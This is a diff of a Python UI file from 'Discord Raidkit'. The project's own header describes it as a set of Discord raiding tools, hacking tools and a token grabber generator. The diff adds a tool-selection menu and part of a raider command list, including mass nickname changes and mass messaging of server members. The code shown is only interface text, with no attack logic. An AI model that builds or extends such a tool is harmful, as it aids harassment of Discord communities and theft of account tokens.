@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
+Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
 Copyright © 2023 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -7,61 +7,45 @@ a collection of raiding tools, hacking tools, and a token grabber generator for 
 This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
-utils.py stores various utility functions used throughout the Discord Raidkit suite.
-utils.py was last updated on 05/03/23 at 20:46 UTC.
+drui.py handles the user interfaces for the program.
+drui.py was last updated on 21/04/23 at 01:37 UTC.
 """
 
-import logging
 import os
-from pathlib import Path
 
-from colorama import init, Fore
+from colorama import Fore
 
-init()
-
-
-def clear_screen() -> int: 
-    return os.system('cls' if os.name == 'nt' else 'clear')
+from config import CONFIG_FILE_PATH
+from utils.dr_repo_utils import MY_VERSION
+from utils.io_utils import valid_input
 
 
-def repeat_prompt_until_valid_input(prompt: str, valid_input: str) -> str:
-    """Repeats a prompt until the user enters a valid input."""
-    clear_screen()
-    user_input = input(prompt)
-    if user_input in valid_input:
-        return user_input
-    else:
-        return repeat_prompt_until_valid_input(prompt, valid_input)
+def select_tool() -> int:
+    """Select a tool to use:
+    
+    Anubis: 1
+    Qetesh: 2
+    Osiris: 3
+    
+    Alternatively, exit: 4."""
+    s = f"""{Fore.LIGHTGREEN_EX}Discord Raidit {MY_VERSION}
+
+{Fore.LIGHTBLUE_EX}[1] Anubis
+{Fore.LIGHTRED_EX}[2] Qetesh
+{Fore.LIGHTYELLOW_EX}[3] Osiris"""
+    s = s + f"{Fore.MAGENTA}" if os.path.exists(CONFIG_FILE_PATH) else s + f"{Fore.LIGHTBLACK_EX}"
+    s = s + f"""
+[4] Edit Anubis/Qetesh Config
+{Fore.RED}[5] Exit
+
+{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}"""
+    return int(valid_input(s, {'1', '2', '3', '4', '5'}, True))
 
 
-def init_logger() -> None:
-    """Initializes the logger."""
-    logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
-                        filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')
-
-
-def mkfile(filepath: str, content: str = '') -> bool:
-    """Make a file if it doesn't exist, including any missing directories in the filepath.
-    Args:
-        filepath (str): the path to the file to be created.
-        content (str, optional): the content to be written to the file. Defaults to "".
-    Returns:
-        bool: True if no errors were raised, False otherwise.
+def raider(prefix: str) -> str:
+    """Return a string to display when the bot is ready.
     """
-    try:
-        file = Path(filepath)
-        file.parent.mkdir(exist_ok=True, parents=True)
-        if content:
-            file.write_text(content)
-        return True
-    except Exception as e:
-        logging.error(f'Error in utils.py - mkfile(): {e}')
-        return False
-
-
-def menu_str(prefix: str) -> str:
-    """Returns the menu string for raiders."""
-    return f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's raiding utility!
+    return f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's raiding utility {Fore.LIGHTWHITE_EX}{MY_VERSION}{Fore.LIGHTGREEN_EX}!
 
 {Fore.LIGHTBLUE_EX}{prefix}nick_all <nickname> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}changes the nickname of all members in the server.
 {Fore.LIGHTBLUE_EX}{prefix}msg_all <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}sends a message to all members in the server.
